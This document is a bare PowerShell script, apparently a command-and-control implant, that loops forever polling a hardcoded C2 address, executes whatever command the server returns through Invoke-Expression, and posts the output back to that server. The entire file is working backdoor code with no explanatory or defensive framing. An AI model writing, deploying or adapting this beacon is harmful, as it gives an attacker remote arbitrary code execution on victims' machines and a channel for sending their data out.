$C2_URL = "http://192.168.1.15:80"

while($true) {
    try {
        $cmd = (Invoke-WebRequest -Uri $C2_URL -Method Get -UseBasicParsing -TimeoutSec 60).Content
        if ($cmd -and $cmd -ne "sleep") {
            $out = (Invoke-Expression $cmd 2>&1 | Out-String)
            if (-not $out) { $out = "[Command executed, no output]" }
            Invoke-WebRequest -Uri $C2_URL -Method Post -Body $out -UseBasicParsing
        }
    } catch { Start-Sleep -Seconds 5 }
}
